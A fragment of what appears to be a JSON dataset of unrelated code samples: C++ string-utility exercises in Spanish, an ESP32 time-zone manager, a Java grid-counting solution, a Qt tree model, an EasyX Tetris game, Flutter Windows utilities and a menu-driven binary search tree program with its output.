digitCount(numerote);\r\n      cout<< digitocontador<<endl;\r\n\r\n      int numero=123;\r\n      string resultado = intToString(numero);\r\n      cout<<resultado<<endl;\r\n\r\n      int b=16;\r\n      string cadenaStringtoInt =\"12AB\"; //Ingresar binarios decimal o hexa\r\n      int iStringtoint= stringToInt(cadenaStringtoInt,b);\r\n      cout<<iStringtoint<<endl;\r\n\r\n      string ssobrecar=\"12323\";\r\n      int istringtoubtsobre= stringToInt(ssobrecar);\r\n      cout<<istringtoubtsobre<<endl;\r\n\r\n      char cchartistring = ' ';\r\n      string sChartostring = charToString(cchartistring);\r\n      cout << sChartostring << endl; // muestra: A\r\n      cout << length(sChartostring) << endl; // muestra: 1\r\n        return 0;\r\n\r\n      string sStringtochar = \" \";\r\n      char cstringtochar = stringToChar(sStringtochar);\r\n      cout << cstringtochar << endl; // muestra: A\r\n      cout << (int)cstringtochar << endl; // muestra: 65\r\n\r\n      string s = \"10\";\r\n      int i = stringToInt(s,10);\r\n      cout << i << endl;\r\n      int i = stringToInt(s);\r\n      cout << i << endl;\r\n\r\n      string s = stringToString(\"Hola\");\r\n      cout << s << endl;\r\n\r\n      double d = 123.4;\r\n      string s = doubleToString(d);\r\n      cout << s << endl;\r\n\r\n      string s = \"123.4\";\r\n      double d = stringToDouble(s);\r\n      cout << d << endl;\r\n\r\n      string s = \"\";\r\n      cout << isEmpty(s) << endl;\r\n\r\n      string s1 = \"cursoDeAlgoritmos\";\r\n      string s2 = \"c\";\r\n      if( startsWith(s1,s2) )\r\n      {\r\n         cout << s2 << \" es prefijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es prefijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s1 = \"curso de patatas\";\r\n      string s2 = \"patatas\";\r\n      if( endsWith(s1,s2) )\r\n      {\r\n      cout << s2 << \" es sufijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es sufijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s = \"abcd\";\r\n      char c = 'a';\r\n      if( contains(s,c) )\r\n      {\r\n         cout << s << \" contiene a: \" << c << endl;\r\n      }\r\n      else\r\n      {\r\n         cout << s << \" NO contiene a: \" << c << endl;\r\n      }\r\n\r\n      string s = \"Esto es una prueba\";\r\n      string r = replace(s,'e','X');\r\n      cout << r << endl;\r\n\r\n      string s = \"Esto es una prueba\";\r\n      int pos = 4;\r\n      char c = 'X';\r\n      string r = insertAt(s,pos,c);\r\n      cout << r << endl;\r\n\r\n      int n = 5;\r\n      string r = spaces(n);\r\n      // muestra: [ ] (cinco espacios)\r\n      cout << \"[\" << r << \"]\" << endl;\r\n\r\n   char c = '3';\r\n   if( isDigit(c) )\r\n   {\r\n   cout << c << \" es digito\" << endl;\r\n   }\r\n   else\r\n   {\r\n   cout << c << \" NO es digito\" << endl;\r\n   }\r\n\r\n   char c = 'X';\r\n   if( isLetter(c) )\r\n   {\r\n   cout << c << \" es letra\" << endl; // SALIDA\r\n   }\r\n   else\r\n   {\r\n      cout << c << \" NO es letra\" << endl;\r\n   }\r\n  }\r\n\r\n   string s1 = \"Pablo\";\r\n   string s2 = \"Queso\";\r\n   if( cmpString(s1,s2)<0 )\r\n   {\r\n   cout << s1 << \" es menor que: \" << s2 << endl;\r\n   }\r\n   else if(cmpString(s1,s2)>0){\r\n   cout << s1 << \" es mayor que: \" << s2 << endl;\r\n   }\r\n   else{\r\n   cout << s1 << \" es igual que: \" << s2 << endl;\r\n   }\r\n\r\n   double x = 25.7;\r\n   double y = 36.9;\r\n   if( cmpDouble(x,y)<0 )\r\n   {\r\n   cout << x << \" es menor que: \" << y << endl;\r\n   }\r\n   else if(cmpDouble(x,y)>0){\r\n      cout << x << \" es mayor que: \" << y << endl;\r\n      }\r\n   else{\r\n      cout << x << \" es igual que: \" << y << endl;\r\n     }\r\n\r\n   char c = 'n';\r\n   char r = toUpperCase(c);\r\n   cout << r << endl;\r\n   }\r\n\r\n   char c = 'n';\r\n   char r = toLowerCase(c);\r\n   cout << r << endl;\r\n\r\n   string s = \"",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <HTTPClient.h>\n\n#include \"TimeZoneManager.h\"\n\nPreferences preferences;\n\nvoid TimeZoneManager::set_logger(logger_cb_t logger) {\n  _logger = logger;\n}\n\n\nvoid TimeZoneManager::begin(ClockManager *clock) {\n  _preferences.begin(\"time\", false);\n  String tz = _preferences.getString(\"tz\", \"\");\n  _preferences.end();\n\n  if (tz != \"\") {\n    setenv(\"TZ\", tz.c_str(), 1);\n    tzset();\n    (*_logger)(\"Loaded TZ = %s\", tz.c_str());\n  } else {\n    if (WiFi.status() == WL_CONNECTED) {\n      set_from_api();\n    }\n  }\n\n  struct tm timeinfo;\n  getLocalTime(&timeinfo);\n  clock->set_displayed_time(timeinfo.tm_hour, timeinfo.tm_min);\n}\n\nvoid TimeZoneManager::set(String tz) {\n  const char* posix = convert_name(tz.c_str());\n  setenv(\"TZ\", posix, 1);\n  tzset();\n\n  _preferences.begin(\"time\", false);\n  _preferences.putString(\"tz\", String(posix));\n  _preferences.end();\n\n  (*_logger)(\"Set time zone to %s\", tz);\n  (*_logger)(\"TZ = %s\", posix);\n}\n\nvoid TimeZoneManager::set_from_api() {\n  #if ENABLE_WIFI == 1\n  WiFiClient client;\n  HTTPClient http;\n\n  (*_logger)(\"Requesting time zone from ip-api.com\");\n\n  http.begin(client, \"http://ip-api.com/line/?fields=256\");\n  int httpResponseCode = http.GET();\n\n  String payload = \"\";\n  if (httpResponseCode > 0) {\n    payload = http.getString();\n    payload.trim();\n    set(payload);\n  } else {\n    (*_logger)(\"Error code: %s\", httpResponseCode);\n  }\n  http.end();\n  #endif\n}\n\nconst char* TimeZoneManager::convert_name(const char* tzdata) {\n  int offset = 0;\n  const char* current = TIME_ZONE_NAMES;\n  while (strlen(current) > 0) {\n    if (strcmp(tzdata, current) == 0) {\n      const char* posix = TIME_ZONE_STRINGS;\n      while (offset > 0 || strcmp(posix, \"~\") == 0) {\n        posix = posix + strlen(posix) + 1;\n        offset--;\n      }\n      return posix;\n    }\n\n    current = current + strlen(current) + 1;\n    offset++;\n  }\n\n  return \"UTC0\";\n}",
    "import java.io.*;\r\nimport java.util.*;\r\n\r\npublic class Main {\r\n    public static void main(String[] args) throws IOException {\r\n        BufferedReader br = new BufferedReader(new InputStreamReader(System.in));\r\n        StringTokenizer st;\r\n\r\n        st = new StringTokenizer(br.readLine());\r\n        int n = Integer.parseInt(st.nextToken());\r\n        int m = Integer.parseInt(st.nextToken());\r\n\r\n        char[][] a = new char[n][m];\r\n        for (int i = 0; i < n; i++) {\r\n            String s = br.readLine();\r\n            a[i] = s.toCharArray();\r\n        }\r\n        char[][] b = new char[n][m];\r\n        for (int i = 0; i < n; i++) {\r\n            String s = br.readLine();\r\n            b[i] = s.toCharArray();\r\n        }\r\n\r\n        int ans = 0;\r\n        for (int i = 0; i < m - 2; i++) {\r\n            for (int j = i + 1; j < m - 1; j++) {\r\n                for (int k = j + 1; k < m; k++) {\r\n                    // System.out.printf(\"%d, %d, %d\\n\", i, j, k);\r\n                    HashSet<String> hs = new HashSet<>();\r\n\r\n                    // System.out.print(\"a | \");\r\n                    for (int r = 0; r < n; r++) {\r\n                        String s = a[r][i] + \"\" + a[r][j] + \"\" + a[r][k];\r\n                        // System.out.print(s + \" \");\r\n                        hs.add(s);\r\n                    }\r\n                    // System.out.println();\r\n\r\n                    boolean isDup = false;\r\n                    for (int r = 0; r < n; r++) {\r\n                        String s = b[r][i] + \"\" + b[r][j] + \"\" + b[r][k];\r\n                        if(hs.contains(s)) {\r\n                            // System.out.printf(\"dup with %s\\n\", s);\r\n                            isDup = true;\r\n                            break;\r\n                        }\r\n                    }\r\n\r\n                    if (isDup) continue;\r\n                    ans++;\r\n                }\r\n            }\r\n        }\r\n\r\n        System.out.println(ans);\r\n    }\r\n}",
    "/**     @file ModelPartList.h\n  *\n  *     EEEE2076 - Software Engineering & VR Project\n  *\n  *     Template for model part list that will be used to create the trewview.\n  *\n  *     P Evans 2022\n  */\n\n#include \"ModelPartList.h\"\n#include \"ModelPart.h\"\n\nModelPartList::ModelPartList( const QString& data, QObject* parent ) : QAbstractItemModel(parent) {\n    /* Have option to specify number of visible properties for each item in tree - the root item\n     * acts as the column headers\n     */\n    rootItem = new ModelPart( { tr(\"Part\"), tr(\"Visible?\") } );\n}\n\n\n\nModelPartList::~ModelPartList() {\n    delete rootItem;\n}\n\n\nint ModelPartList::columnCount( const QModelIndex& parent ) const {\n    Q_UNUSED(parent);\n\n    return rootItem->columnCount();\n}\n\n\nQVariant ModelPartList::data( const QModelIndex& index, int role ) const {\n    /* If the item index isnt valid, return a new, empty QVariant (QVariant is generic datatype\n     * that could be any valid QT class) */\n    if( !index.isValid() )\n        return QVariant();\n\n    /* Role represents what this data will be used for, we only need deal with the case\n     * when QT is asking for data to create and display the treeview. Return a new,\n     * empty QVariant if any other request comes through. */\n    if (role != Qt::DisplayRole)\n        return QVariant();\n\n    /* Get a a pointer to the item referred to by the QModelIndex */\n    ModelPart* item = static_cast<ModelPart*>( index.internalPointer() );\n\n    /* Each item in the tree has a number of columns (\"Part\" and \"Visible\" in this \n     * initial example) return the column requested by the QModelIndex */\n    return item->data( index.column() );\n}\n\n\nQt::ItemFlags ModelPartList::flags( const QModelIndex& index ) const {\n    if( !index.isValid() )\n        return Qt::NoItemFlags;\n\n    return QAbstractItemModel::flags( index );\n}\n\n\nQVariant ModelPartList::headerData( int section, Qt::Orientation orientation, int role ) const {\n    if( orientation == Qt::Horizontal && role == Qt::DisplayRole )\n        return rootItem->data( section );\n\n    return QVariant();\n}\n\n\nQModelIndex ModelPartList::index(int row, int column, const QModelIndex& parent) const {\n    ModelPart* parentItem;\n    \n    if( !parent.isValid() || !hasIndex(row, column, parent) )\n        parentItem = rootItem;              // default to selecting root \n    else\n        parentItem = static_cast<ModelPart*>(parent.internalPointer());\n\n    ModelPart* childItem = parentItem->child(row);\n    if( childItem )\n        return createIndex(row, column, childItem);\n    \n    \n    return QModelIndex();\n}\n\n\nQModelIndex ModelPartList::parent( const QModelIndex& index ) const {\n    if (!index.isValid())\n        return QModelIndex();\n\n    ModelPart* childItem = static_cast<ModelPart*>(index.internalPointer());\n    ModelPart* parentItem = childItem->parentItem();\n\n    if( parentItem == rootItem )\n        return QModelIndex();\n\n    return createIndex( parentItem->row(), 0, parentItem );\n}\n\n\nint ModelPartList::rowCount( const QModelIndex& parent ) const {\n    ModelPart* parentItem;\n    if( parent.column() > 0 )\n        return 0;\n\n    if( !parent.isValid() )\n        parentItem = rootItem;\n    else\n        parentItem = static_cast<ModelPart*>(parent.internalPointer());\n\n    return parentItem->childCount();\n}\n\n\nModelPart* ModelPartList::getRootItem() {\n    return rootItem; \n}\n\n\n\nQModelIndex ModelPartList::appendChild(QModelIndex& parent, const QList<QVariant>& data) {      \n    ModelPart* parentPart;\n\n    if (parent.isValid())\n        parentPart = static_cast<ModelPart*>(parent.internalPointer());\n    else {\n        parentPart = rootItem;\n        parent = createIndex(0, 0, rootItem );\n    }\n\n    beginInsertRows( parent, rowCount(parent), rowCount(parent) ); \n\n    ModelPart* childPart = new ModelPart( data, parentPart );\n\n    parentPart->appendChild(childPart);\n\n    QModelIndex child = createIndex(0, 0, childPart);\n\n    endInsertRows();\n\n    emit layoutChanged();\n\n    return child;\n}\n\n",
    "#include \"Tetris.h\"\n#include <time.h>\n#include <stdlib.h>\n#include <conio.h> //\u63a7\u5236\u53f0\u7684io\u8f93\u5165\u8f93\u51fa,\u952e\u76d8\n#include <iostream>\n#include <fstream>\n#include \"Block.h\"\n#include <mmsystem.h>\n#pragma comment(lib,\"winmm.lib\")\n\n#define MAX_LEVEL 5\n#define RECORDER_FILE \"recorder.txt\"\n\n//const int SPEED_NORMAL = 500; //ms\nconst int SPEED_NORMAL[MAX_LEVEL] = { 500,400,300,200,100 };\nconst int SPEED_QUICK = 50;\n\nTetris::Tetris(int rows, int cols, int left, int top, int blockSize)\n{\n\tthis->rows = rows;\n\tthis->cols = cols;\n\tthis->leftMargin = left;\n\tthis->topMargin = top;\n\tthis->blockSize = blockSize;\n\n\tfor (int i = 0;i < rows;i++)\n\t{\n\t\tvector<int> mapRow;\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tmapRow.push_back(0);\n\t\t}\n\t\tmap.push_back(mapRow);\n\t}\n}\n\nvoid Tetris::init()\n{\n\tmciSendString(\"play res/bg.mp3 repeat\", 0, 0, 0);\n\t\n\tdelay = SPEED_NORMAL[0];\n\n\t//\u914d\u7f6e\u968f\u673a\u79cd\u5b50\n\tsrand(time(NULL));\n\n\t//\u521b\u5efa\u6e38\u620f\u7a97\u53e3\n\tinitgraph(938, 896);\n\n\t//\u52a0\u8f7d\u80cc\u666f\u56fe\u7247\n\tloadimage(&imgBg, \"res/bg2.png\");\n\n\tloadimage(&imgWin, \"res/win.png\");\n\tloadimage(&imgOver, \"res/over.png\");\n\n\t//\u521d\u59cb\u5316\u6e38\u620f\u533a\u4e2d\u7684\u6570\u636e\n\tchar data[20][10];\n\tfor (int i = 0;i < rows;i++)\n\t{\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tmap[i][j] = 0;\n\t\t}\n\t}\n\n\tscore = 0;\n\tlineCount = 0;\n\tlevel = 1;\n\n\t//\u521d\u59cb\u5316\u6700\u9ad8\u5206\n\tifstream file(RECORDER_FILE);\n\tif (!file.is_open())\n\t{\n\t\tcout << RECORDER_FILE << \"\u6253\u5f00\u5931\u8d25\" << endl;\n\t\thighestScore = 0;\n\t}\n\telse\n\t{\n\t\tfile >> highestScore;\n\t}\n\tfile.close(); //\u5173\u95ed\u6587\u4ef6\n\n\tgameOver = false;\n}\n\nvoid Tetris::play()\n{\n\tinit();\n\n\tnextBlock = new Block;\n\tcurBlock = nextBlock;\n\tnextBlock = new Block;\n\n\tint timer = 0;\n\twhile (1)\n\t{\n\t\t//\u63a5\u53d7\u7528\u6237\u7684\u8f93\u5165\n\t\tkeyEvent();\n\t\ttimer += getDelay();\n\t\tif (timer > delay)\n\t\t{\n\t\t\ttimer = 0;\n\t\t\tdrop();\n\t\t\t//\u6e32\u67d3\u6e38\u620f\u753b\u9762\n\t\t\tupdate = true;\n\t\t}\n\n\t\tif (update)\n\t\t{\n\t\t\tupdate = false;\n\t\t\t//\u66f4\u65b0\u6e38\u620f\u7684\u753b\u9762\n\t\t\tupdateWindow();\n\t\t\t\n\t\t\t//\u66f4\u6539\u6e38\u620f\u6570\u636e\n\t\t\tclearLine();\n\t\t}\n\n\t\tif (gameOver)\n\t\t{\n\t\t\t//\u4fdd\u5b58\u5206\u6570\n\t\t\tsaveScore();\n\t\t\t//\u66f4\u65b0\u6e38\u620f\u7ed3\u675f\u754c\u9762\n\t\t\tdisplayOver();\n\n\t\t\tsystem(\"pause\");\n\t\t\tinit(); //\u91cd\u65b0\u5f00\u5c40\n\t\t}\n\t}\n}\n\nvoid Tetris::keyEvent()\n{\n\tunsigned char ch; //\u6709\u7b26\u53f7\u8303\u56f4\uff1a-128,127\n\tbool rotateFlag = false;\n\tint dx = 0;\n\tif (_kbhit()) //\u6309\u952e\u8f93\u5165\n\t{\n\t\tch = _getch();\n\n\t\t//\u5982\u679c\u6309\u4e0b\u65b9\u5411\u952e\uff0c\u4f1a\u81ea\u52a8\u8fd4\u56de\u4e24\u4e2a\u5b57\u7b26\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u4e0a\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 72\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u4e0b\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 80\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u5de6\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 75\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u53f3\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 77\n\t\tif (ch == 224)\n\t\t{\n\t\t\tch = _getch();\n\t\t\tswitch (ch)\n\t\t\t{\n\t\t\tcase 72:\n\t\t\t\trotateFlag = true;\n\t\t\t\tbreak;\n\t\t\tcase 80:\n\t\t\t\tdelay = SPEED_QUICK;\n\t\t\t\tbreak;\n\t\t\tcase 75:\n\t\t\t\tdx = -1;\n\t\t\t\tbreak;\n\t\t\tcase 77:\n\t\t\t\tdx = 1;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (rotateFlag)\n\t{\n\t\trotate();\n\t\tupdate = true;\n\t}\n\n\tif (dx != 0)\n\t{\n\t\tmoveLeftRight(dx);\n\t\tupdate = true;\n\t}\n}\n\nvoid Tetris::updateWindow()\n{\n\tIMAGE** imgs = Block::getImages();\n\tBeginBatchDraw(); //\u9632\u6b62\u95ea\u70c1\n\n\tputimage(0, 0, &imgBg);  //\u7ed8\u5236\u80cc\u666f\u56fe\u7247\n\n\tfor (int i = 0;i < rows;i++)\n\t{\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tif (map[i][j] == 0)\n\t\t\t\tcontinue;\n\t\t\tint x = j * blockSize + leftMargin;\n\t\t\tint y = i * blockSize + topMargin;\n\t\t\tputimage(x, y, imgs[map[i][j] - 1]);\n\t\t}\n\t}\n\n\tcurBlock->draw(leftMargin, topMargin);\n\tnextBlock->draw(689, 150);\n\n\tdrawScore();  //\u7ed8\u5236\u5206\u6570\n\n\tEndBatchDraw();\n}\n\n//\u7b2c\u4e00\u6b21\u8c03\u7528\uff0c\u8fd4\u56de0\n//\u8fd4\u56de\u8ddd\u79bb\u4e0a\u4e00\u6b21\u8c03\u7528\u95f4\u9694\nint Tetris::getDelay()\n{\n\tstatic unsigned long long lastTime = 0;\n\tunsigned long long currentTime = GetTickCount();\n\n\tif (lastTime == 0)\n\t{\n\t\tlastTime = currentTime;\n\t\treturn 0;\n\t}\n\telse\n\t{\n\t\tint ret = currentTime - lastTime;\n\t\tlastTime = currentTime;\n\t\treturn ret;\n\t}\n}\n\nvoid Tetris::drop()\n{\n\tbakBlock = *curBlock;\n\tcurBlock->drop();\n\n\tif (curBlock->blockInMap(map) == false)\n\t{\n\t\tdelay = SPEED_NORMAL[level-1]; //\u5230\u5e95\u540e\u901f\u5ea6\u53d8\u56de\u5e38\u89c4\n\t\t//\u628a\u8fd9\u4e2a\u65b9\u5757\u56fa\u5316\n\t\tbakBlock.solidify(map);\n\t\tdelete curBlock;\n\t\tcurBlock = nextBlock;\n\t\tnextBlock = new Block;\n\n\t\t//\u68c0\u67e5\u6e38\u620f\u662f\u5426\u7ed3\u675f\n\t\tcheckOver();\n\t}\n}\n\nvoid Tetris::clearLine()\n{\n\tint lines = 0;\n\tint k = rows - 1; //\u5b58\u50a8\u6570\u636e\u7684\u884c\u6570\n\tfor (int i = rows - 1;i >= 0;i--)\n\t{\n\t\tint count = 0;\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tif (map[i][j])\n\t\t\t{\n\t\t\t\tcount++;\n\t\t\t}\n\t\t\tmap[k][j] = map[i][j]; //\u5148\u5b58\u4e0b\uff0c\u5982\u679c\u8981\u6d88\u9664\uff0c\u63a5\u7740\u672c\u884c\u5b58\u50a8\n\t\t}\n\t\tif(count < cols) //\u5982\u679c\u4e0d\u7528\u6d88\u9664\uff0c\u5219\u5b58\u4e0a\u4e00\u884c\n\t\t{\n\t\t\tk--;\n\t\t}\n\t\telse //\u6d88\u9664\uff0ck\u4e0d\u52a8\u4e0b\u6b21\u63a5\u7740\u5b58\u672c\u884c\n\t\t{\n\t\t\tlines++;\n\t\t}\n\t}\n\tif (lines > 0)\n\t{\n\t\t//\u8ba1\u7b97\u5f97\u5206\n\t\tint addScore[4] = { 10,30,60,80 };\n\t\tscore += addScore[lines - 1];\n\n\t\tmciSendString(\"play res/xiaochu1.mp3\", 0, 0, 0);\n\t\tupdate = true;\n\n\t\t//\u6bcf100\u5206\u4e00\u4e2a\u7ea7\u522b 0-100 \u7b2c\u4e00\u5173 101-200\u7b2c\u4e8c\u5173\n\t\tlevel = (score + 99) / 100;\n\t\tif (level > MAX_LEVEL)\n\t\t{\n\t\t\tgameOver = true;\n\t\t}\n\n\t\tlineCount += lines;\n\t}\n}\n\nvoid Tetris::moveLeftRight(int offset)\n{\n\tbakBlock = *curBlock;\n\tcurBlock->moveLeftRight(offset);\n\n\tif (!curBlock->blockInMap(map))\n\t{\n\t\t*curBlock = bakBlock;\n\t}\n}\n\nvoid Tetris::rotate()\n{\n\tif (curBlock->getBlockType() == 7) return;\n\n\tbakBlock = *curBlock;\n\tcurBlock->rotate();\n\n\tif (!curBlock->blockInMap(map))\n\t{\n\t\t*curBlock = bakBlock;\n\t}\n}\n\nvoid Tetris::drawScore()\n{\n\tchar scoreText[32];\n\tsprintf_s(scoreText, sizeof(scoreText), \"%d\", score);\n\n\tsetcolor(RGB(180, 180, 180));\n\n\tLOGFONT f;\n\tgettextstyle(&f);  //\u83b7\u53d6\u5f53\u524d\u7684\u5b57\u4f53\n\tf.lfHeight = 60;\n\tf.lfWeight = 30;\n\tf.lfQuality = ANTIALIASED_QUALITY; //\u8bbe\u7f6e\u5b57\u4f53\u4e3a\u201c\u6297\u952f\u9f7f\u201d\u6548\u679c\n\tstrcpy_s(f.lfFaceName, sizeof(f.lfFaceName), _T(\"Segoe UI Black\"));\n\tsettextstyle(&f);\n\n\tsetbkmode(TRANSPARENT); //\u5b57\u4f53\u7684\u80cc\u666f",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include<iostream>\r\nusing namespace std;\r\nclass node {\r\n public:\r\n int data;\r\n node *left;\r\n node *right;\r\n};\r\nclass bst {\r\npublic:\r\n node *root;\r\nbst() {\r\n root=NULL;\r\n}\r\nvoid create();\r\nvoid insert();\r\nvoid postorder(node*);\r\nvoid inorder(node *);\r\n void preorder(node *);\r\n void search(int key);\r\nvoid minimum();\r\nint height(node*);\r\n};\r\nvoid bst::minimum() {\r\n node *temp;\r\nint min;\r\n temp=root;\r\nwhile(temp->left!=NULL) {\r\n min=temp->data;\r\n temp=temp->left;\r\n if(temp->data<min) {\r\n min=temp->data;\r\n }\r\n else {\r\n temp=temp->left;\r\n }\r\n}\r\ncout<<\"minimum no. is:\"<<min;\r\n}\r\nint bst::height(node *root) {\r\nif(root==NULL) {\r\n return 0;\r\n}\r\nelse {\r\n if(height(root->right)>height(root->left)) {\r\n return (1+height(root->right));\r\n }\r\n else {\r\n return (1+height(root->left));\r\n }\r\n}\r\n}\r\nvoid bst::create() {\r\nnode *curr,*temp;\r\nint ans=1;\r\ncout<<\"enter data:\";\r\ndo {\r\n curr=new node;\r\n cin>>curr->data;\r\n curr->left=curr->right=NULL;\r\n if(root==NULL) {\r\n root=curr;\r\n }\r\n else {\r\n temp=root;\r\n while(1) {\r\n if(curr->data<=temp->data) {\r\n if(temp->left==NULL) {\r\n temp->left=curr;\r\n break;\r\n }\r\n else {\r\n temp=temp->left;\r\n }\r\n}\r\nelse {\r\n if(temp->right==NULL) {\r\n temp->right=curr;\r\nbreak;\r\n }\r\nelse {\r\n temp=temp->right;\r\n }\r\n }\r\n }\r\n }\r\n cout<<\"want to continue:\";\r\n cin>>ans;\r\n}while(ans==1);\r\n}\r\nvoid bst::inorder(node *root) {\r\nif(root!=NULL) {\r\n inorder(root->left);\r\n cout<<\" \"<<root->data;\r\n inorder(root->right);\r\n}\r\n}\r\nvoid bst::preorder(node *root) {\r\nif(root!=NULL) {\r\n cout<<\" \"<<root->data;\r\n preorder(root->left);\r\n preorder(root->right);\r\n}\r\n}\r\nvoid bst::postorder(node *root) {\r\nif(root!=NULL) {\r\n postorder(root->left);\r\n postorder(root->right);\r\n cout<<\" \"<<root->data;\r\n}\r\n}\r\nvoid bst::insert() {\r\nnode *curr,*temp;\r\nint ans=1;\r\ncout<<\"enter data:\";\r\ncurr=new node;\r\ncin>>curr->data;\r\ncurr->left=curr->right=NULL;\r\nif(root==NULL) {\r\n root=curr;\r\n}\r\nelse {\r\n temp=root;\r\n while(1) {\r\n if(curr->data<=temp->data) {\r\n if(temp->left==NULL) {\r\n temp->left=curr;\r\nbreak;\r\n }\r\nelse {\r\n temp=temp->left;\r\n }\r\n }\r\n else {\r\n if(temp->right==NULL) {\r\n temp->right=curr;\r\nbreak;\r\n }\r\nelse {\r\n temp=temp->right;\r\n }\r\n }\r\n }\r\n}\r\n}\r\nvoid bst::search(int key) {\r\nnode *curr;\r\ncurr=root;\r\nwhile(curr!=NULL) {\r\n if(curr->data==key) {\r\n cout<<\"found\";\r\n break;\r\n }\r\n else {\r\n if(key<curr->data) {\r\n curr=curr->left;\r\n }\r\n else {\r\n curr=curr->right;\r\n }\r\n }\r\n}\r\nif(curr==NULL) {\r\n cout<<\"not found\";\r\n}\r\n}\r\nint main() {\r\nbst b;\r\nint key,ch;\r\ndo {\r\n    cout<<\"\\n1.create\\n2.insert\\n3.inorder\\n4.preorder\\n5.postorder\\n6.search\\n7.minimum\\n8.height\\npress 0 to exit\\n\";\r\n           \r\ncout<<\"enter your choice:\";\r\n cin>>ch;\r\n switch(ch) {\r\n case 1:\r\n b.create();\r\nbreak;\r\n case 2:\r\n b.insert();\r\nbreak;\r\n case 3:\r\n cout<<\"inorder traversal is\\n\";\r\nb.inorder(b.root);\r\nbreak;\r\n case 4:\r\n cout<<\"preorder traversal is\\n\";\r\nb.preorder(b.root);\r\nbreak;\r\n case 5:\r\n cout<<\"postorder traversal is\\n\";\r\n b.postorder(b.root);\r\nbreak;\r\n case 6:\r\n cout<<\"\\nenter key:\";\r\ncin>>key;\r\nb.search(key);\r\nbreak;\r\n case 7:\r\n b.minimum();\r\nbreak;\r\n case 8:\r\n cout<<\"height of tree: \"<<b.height(b.root);\r\nbreak;\r\n }\r\n}while(ch!=0);\r\nreturn 0;\r\n}\r\n\r\nOUTPUT:\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:1\r\nenter data:45\r\nwant to continue:0\r\n\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:2\r\nenter data:47\r\n\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:2\r\nenter data:67\r\n\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:2\r\nenter data:12\r\n\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:2\r\nenter data:89\r\n\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:3\r\ninorder traversal is\r\n 12 45 47 67 89\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:4\r\npreorder traversal is\r\n 45 12 47 67 89\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:5\r\npostorder traversal is\r\n 12 89 67 47 45\r\n1.create\r\n2.insert\r\n3.inorder\r\n4.preorder\r\n5.postorder\r\n6.search\r\n7.minimum\r\n8.height\r\npress 0 to exit\r\nenter your choice:6\r\n\r\nenter 